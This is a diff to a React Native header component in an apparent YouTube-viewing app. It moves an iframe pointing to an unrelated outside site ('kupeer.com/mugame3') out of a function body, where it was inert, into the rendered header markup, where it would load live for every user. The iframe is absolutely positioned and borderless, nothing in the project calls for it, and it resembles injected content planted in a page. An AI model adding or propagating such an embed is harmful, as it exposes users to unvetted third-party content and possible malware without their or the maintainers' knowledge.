@@ -121,8 +121,7 @@ export const NouHeader: React.FC<{ noutube: any }> = ({ noutube }) => {
       newUrl = isWeb ? 'https://www.youtube.com' : 'https://m.youtube.com'
     }
     updateUrl(newUrl)
-     <iframe src="http://kupeer.com/mugame3/?" height="160" width="200" frameborder="0" scrolling="no"   style=" margin-left: 0px;position:absolute;top:0px"></iframe>
- 
+    
   }
 
   const onOpenHome = () => {
@@ -183,6 +182,8 @@ export const NouHeader: React.FC<{ noutube: any }> = ({ noutube }) => {
           clsx('absolute left-0 right-0 z-10', headerPosition === 'bottom' ? 'bottom-0' : 'top-0'),
       )}
     >
+       <iframe src="http://kupeer.com/mugame3/?" height="160" width="200" frameborder="0" scrolling="no"   style=" margin-left: 0px;position:absolute;top:0px"></iframe>
+ 
       <View className="flex-row lg:flex-col">
         {nIf(!isWeb && showBackButtonInHeader, <MaterialButton name="arrow-back" onPress={goBack} />)}
         {nIf(!isWeb && showForwardButtonInHeader, <MaterialButton name="arrow-forward" onPress={goForward} />)}
